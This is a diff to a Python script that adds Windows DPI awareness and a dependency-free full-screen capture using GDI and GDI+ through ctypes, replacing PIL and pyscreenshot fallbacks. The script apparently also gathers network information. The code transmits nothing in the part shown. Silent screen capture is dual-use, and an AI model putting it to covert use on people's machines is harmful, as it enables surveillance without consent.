@@ -57,6 +57,16 @@ if _footer_cfg:
 
 IS_WINDOWS = sys.platform == 'win32'
 
+if IS_WINDOWS:
+    try:
+        import ctypes
+        ctypes.windll.shcore.SetProcessDpiAwareness(2)
+    except Exception:
+        try:
+            ctypes.windll.user32.SetProcessDPIAware()
+        except Exception:
+            pass
+
 
 # ---- Network Info ----
 
@@ -170,18 +180,110 @@ def get_network_info():
 
 # ---- Screenshot ----
 
+def _screenshot_windows():
+    """Take screenshot using Windows GDI + GDI+ (no PIL dependency)."""
+    import ctypes
+    from ctypes import wintypes
+    import io as io_mod
+    import uuid as _uuid
+    import os as _os
+    import struct
+
+    user32 = ctypes.windll.user32
+    gdi32 = ctypes.windll.gdi32
+
+    x = user32.GetSystemMetrics(76)
+    y = user32.GetSystemMetrics(77)
+    w = user32.GetSystemMetrics(78)
+    h = user32.GetSystemMetrics(79)
+    if w <= 0 or h <= 0:
+        w = user32.GetSystemMetrics(0)
+        h = user32.GetSystemMetrics(1)
+        x = y = 0
+
+    hdc_screen = user32.GetDC(0)
+    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
+    hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, w, h)
+    old = gdi32.SelectObject(hdc_mem, hbmp)
+    gdi32.BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, x, y, 0x00CC0020 | 0x40000000)
+    gdi32.SelectObject(hdc_mem, old)
+
+    result = None
+
+    try:
+        gdiplus = ctypes.windll.gdiplus
+
+        class _SI(ctypes.Structure):
+            _pack_ = 1
+            _fields_ = [
+                ('Version', wintypes.DWORD),
+                ('DebugCb', ctypes.c_void_p),
+                ('NoBg', wintypes.BOOL),
+                ('NoExt', wintypes.BOOL),
+            ]
+
+        si = _SI(1, None, 1, 0)
+
+        # ULONG_PTR is pointer-sized (4 bytes on 32-bit, 8 on 64-bit)
+        is64 = struct.calcsize('P') == 8
+        if is64:
+            token = ctypes.c_ulonglong()
+        else:
+            token = ctypes.c_ulong()
+        if gdiplus.GdiplusStartup(ctypes.byref(token), ctypes.byref(si), None) != 0:
+            gdi32.DeleteObject(hbmp)
+            gdi32.DeleteDC(hdc_mem)
+            user32.ReleaseDC(0, hdc_screen)
+            return None
+
+        try:
+            gp_bmp = ctypes.c_void_p()
+            status = gdiplus.GdipCreateBitmapFromHBITMAP(hbmp, 0, ctypes.byref(gp_bmp))
+            if status != 0:
+                raise RuntimeError(f'GdipCreateBitmapFromHBITMAP failed: {status}')
+
+            class GUID(ctypes.Structure):
+                _fields_ = [
+                    ('Data1', wintypes.DWORD),
+                    ('Data2', wintypes.WORD),
+                    ('Data3', wintypes.WORD),
+                    ('Data4', ctypes.c_byte * 8),
+                ]
+
+            jpeg_clsid = _uuid.UUID('{557CF401-1A04-11D3-9A73-0000F81EF32E}')
+            clsid = GUID.from_buffer_copy(jpeg_clsid.bytes_le)
+
+            tmp = _os.path.join(_os.environ.get('TEMP', '.'), f'_s{_uuid.uuid4().hex[:8]}.jpg')
+            status = gdiplus.GdipSaveImageToFile(
+                gp_bmp, ctypes.c_wchar_p(tmp), ctypes.byref(clsid), None)
+            if status != 0:
+                raise RuntimeError(f'GdipSaveImageToFile failed: {status}')
+
+            if _os.path.exists(tmp):
+                with open(tmp, 'rb') as f:
+                    result = io_mod.BytesIO(f.read())
+                _os.unlink(tmp)
+
+            gdiplus.GdipDisposeImage(gp_bmp)
+        finally:
+            gdiplus.GdiplusShutdown(token)
+    except Exception:
+        result = None
+
+    gdi32.DeleteObject(hbmp)
+    gdi32.DeleteDC(hdc_mem)
+    user32.ReleaseDC(0, hdc_screen)
+
+    return result
+
+
 def take_screenshot():
     """Take a screenshot. Platform-specific methods with fallbacks."""
     import io as io_mod
 
     if IS_WINDOWS:
         try:
-            from PIL import ImageGrab
-            img = ImageGrab.grab(all_screens=True)
-            buf = io_mod.BytesIO()
-            img.save(buf, format='JPEG', quality=60)
-            buf.seek(0)
-            return buf
+            return _screenshot_windows()
         except Exception:
             return None
 
@@ -197,17 +299,6 @@ def take_screenshot():
                 return io_mod.BytesIO(proc.stdout)
         except Exception:
             continue
-
-    # Last resort: try PIL+pyscreenshot
-    try:
-        import pyscreenshot
-        img = pyscreenshot.grab()
-        buf = io_mod.BytesIO()
-        img.save(buf, format='JPEG', quality=60)
-        buf.seek(0)
-        return buf
-    except Exception:
-        pass
 
     return None
 
